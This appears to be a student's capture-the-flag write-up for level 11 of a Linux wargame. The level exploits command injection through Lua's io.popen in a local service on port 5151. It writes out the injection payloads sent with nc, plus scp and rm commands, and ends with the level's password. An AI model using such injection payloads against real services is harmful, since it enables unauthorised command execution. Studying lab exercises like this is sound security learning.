# LEVEL 11

## 💡 Explanation

In this level we have to:
1. Check the permissions of level11.lua
2. Check the code => we see that it opens a socket on localhost:5151
3. When we launch it, it give an error saying that the address is not available, but we cannot see anything with `netstat`, it should be another user (probs flag11) who is running it.
4. If the open a listener on the port 5151 it replies asking for the password so the program it is being executed in the background!
5. Now we need to understand how to exploit it => It uses the function `io.popen`, which executes a command!!
6. The command it is using concatenates an `echo` with the input we give and then it pipes it to a `sha1sum`. Voilà

What helped A LOT was to write a lot of prints in between and do another code and also luch it in the backgroup with another port, so I could test everything 😊 => `alias lua=/Users/cristina/Downloads/lua-5.4.4/src/lua` and `lua level11_cristina.lua`

## 👾 Commands

To find the solution:
```
la -la level11.lua
./level11.lua
netstat -ltnp | grep -w ':5151'
scp -P 4242 level11@192.168.56.3:/home/user/level11/level11.lua .
nc localhost 5151
Password: 
Password: a => Checked with sha1sum
Password: ; echo `ls`; echo lol
```

To exploit the security hole:
- `rm -rf /tmp/flag`
- `nc localhost 5151`
- `o; echo 'getflag' > /tmp/flag; echo lol`  (*)
<!-- - `o; echo `getflag` > /tmp/flag; echo lol`  (*) -->
- `cat /tmp/flag`

(*) Be careful with the quotes on que second command, it should be (`) instead of (').

## 🔍 Resources

- [Address already in use while binding socket](https://stackoverflow.com/questions/5106674/error-address-already-in-use-while-binding-socket-with-address-but-the-port-num)
- [Find out used ports](https://www.tecmint.com/find-out-which-process-listening-on-a-particular-port/)
- [Install sha1sum](https://command-not-found.com/sha1sum)
- [Lua - Online demo](https://www.lua.org/cgi-bin/demo)
- [Lua - Download](http://www.lua.org/download.html)
- [Lua - Conditions](https://craftstudio.fandom.com/fr/wiki/Tutoriels/Apprendre_%C3%A0_programmer_en_Lua/Les_conditions#:~:text=Le%20If%20est%20la%20structure,plac%C3%A9e%20entre%20then%20et%20end.)
- [Lua - Concatenation](https://www.lua.org/pil/3.4.html)
- [Lua - io.open](https://www.tutorialspoint.com/lua/lua_file_io.htm)
- [Lua - io.read](http://www.lua.org/pil/21.1.html)
- [Lua - io.popen](https://www.tutorialspoint.com/io-popen-function-in-lua-programming)

## 🔥 Password
`fa6v5ateaw21peobuub8ipe6s`
